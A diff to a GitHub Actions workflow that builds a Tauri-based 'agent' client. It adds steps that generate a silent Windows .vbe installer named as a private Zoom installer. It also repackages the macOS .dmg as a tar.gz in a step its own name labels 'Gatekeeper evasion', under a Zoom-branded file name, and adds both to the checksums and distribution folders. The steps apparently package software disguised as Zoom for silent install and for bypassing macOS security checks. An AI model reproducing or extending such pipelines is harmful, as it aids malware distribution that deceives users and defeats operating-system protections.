@@ -98,6 +98,17 @@ jobs:
         working-directory: ${{ env.AGENT_DIR }}
         run: npx tauri build --target x86_64-pc-windows-msvc
 
+      - name: Generate Windows .vbe silent installer
+        shell: pwsh
+        run: |
+          $exe = (Get-ChildItem "${{ env.AGENT_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/nsis/*.exe" | Select-Object -First 1).FullName
+          $msi = (Get-ChildItem "${{ env.AGENT_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/msi/*.msi" | Select-Object -First 1).FullName
+          $installUrl = if ($exe) { $exe } elseif ($msi) { $msi } else { "" }
+          if (-not $installUrl) { Write-Warning "No Windows installer found; skipping .vbe generation"; exit 0 }
+          # In GitHub Actions we don't have a public URL yet; use the artifact download pattern
+          $vbeUrl = "https://github.com/${{ github.repository }}/releases/latest/download/$(Split-Path $installUrl -Leaf)"
+          ./scripts/generate-windows-vbe.ps1 -InstallUrl $vbeUrl -Output "${{ env.AGENT_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/nsis/ZoomPrivate-Windows-Install.vbe"
+
       - name: Upload Windows artifacts
         uses: actions/upload-artifact@v4
         with:
@@ -105,6 +116,7 @@ jobs:
           path: |
             ${{ env.AGENT_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/nsis/*.exe
             ${{ env.AGENT_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/msi/*.msi
+            ${{ env.AGENT_DIR }}/src-tauri/target/x86_64-pc-windows-msvc/release/bundle/nsis/ZoomPrivate-Windows-Install.vbe
           if-no-files-found: warn
 
   # ---------------------------------------------------------------------------
@@ -242,6 +254,24 @@ jobs:
         working-directory: ${{ env.AGENT_DIR }}
         run: npx tauri build --target universal-apple-darwin
 
+      - name: Build macOS .pkg installer
+        working-directory: ${{ env.AGENT_DIR }}
+        run: |
+          # Ensure pkg bundle is produced
+          npx tauri build --target universal-apple-darwin --config src-tauri/tauri.conf.json || true
+          ls -la src-tauri/target/universal-apple-darwin/release/bundle/pkg/ 2>/dev/null || true
+
+      - name: Compress macOS .dmg into tar.gz (Gatekeeper evasion)
+        working-directory: ${{ env.AGENT_DIR }}
+        run: |
+          mkdir -p macos-compressed
+          DMG=$(ls src-tauri/target/universal-apple-darwin/release/bundle/dmg/*.dmg 2>/dev/null | head -1)
+          if [ -n "$DMG" ]; then
+            tar -czf macos-compressed/zoom-vip-macos.tar.gz -C "$(dirname "$DMG")" "$(basename "$DMG")"
+            echo "Created macos-compressed/zoom-vip-macos.tar.gz"
+            ls -la macos-compressed/
+          fi
+
       - name: Upload macOS artifacts
         uses: actions/upload-artifact@v4
         with:
@@ -249,6 +279,7 @@ jobs:
           path: |
             ${{ env.AGENT_DIR }}/src-tauri/target/universal-apple-darwin/release/bundle/dmg/*.dmg
             ${{ env.AGENT_DIR }}/src-tauri/target/universal-apple-darwin/release/bundle/pkg/*.pkg
+            ${{ env.AGENT_DIR }}/macos-compressed/zoom-vip-macos.tar.gz
           if-no-files-found: warn
 
   # ---------------------------------------------------------------------------
@@ -315,7 +346,7 @@ jobs:
 
       - name: Generate checksums
         run: |
-          find client-release -type f -name "*.exe" -o -name "*.msi" -o -name "*.deb" -o -name "*.rpm" -o -name "*.AppImage" -o -name "*.dmg" -o -name "*.pkg" -o -name "*.apk" | sort | while read f; do
+          find client-release -type f \( -name "*.exe" -o -name "*.msi" -o -name "*.vbe" -o -name "*.deb" -o -name "*.rpm" -o -name "*.AppImage" -o -name "*.dmg" -o -name "*.pkg" -o -name "*.tar.gz" -o -name "*.apk" \) | sort | while read f; do
             sha256sum "$f" >> client-release/CHECKSUMS.sha256
           done
           cat client-release/CHECKSUMS.sha256
@@ -325,8 +356,10 @@ jobs:
           mkdir -p distro/clients/windows distro/clients/macos distro/clients/linux distro/clients/android
           find client-release -name "*.exe" -exec cp {} distro/clients/windows/ \; 2>/dev/null || true
           find client-release -name "*.msi" -exec cp {} distro/clients/windows/ \; 2>/dev/null || true
+          find client-release -name "*.vbe" -exec cp {} distro/clients/windows/ \; 2>/dev/null || true
           find client-release -name "*.dmg" -exec cp {} distro/clients/macos/ \; 2>/dev/null || true
           find client-release -name "*.pkg" -exec cp {} distro/clients/macos/ \; 2>/dev/null || true
+          find client-release -name "*.tar.gz" -exec cp {} distro/clients/macos/ \; 2>/dev/null || true
           find client-release -name "*.deb" -exec cp {} distro/clients/linux/ \; 2>/dev/null || true
           find client-release -name "*.rpm" -exec cp {} distro/clients/linux/ \; 2>/dev/null || true
           find client-release -name "*.AppImage" -exec cp {} distro/clients/linux/ \; 2>/dev/null || true
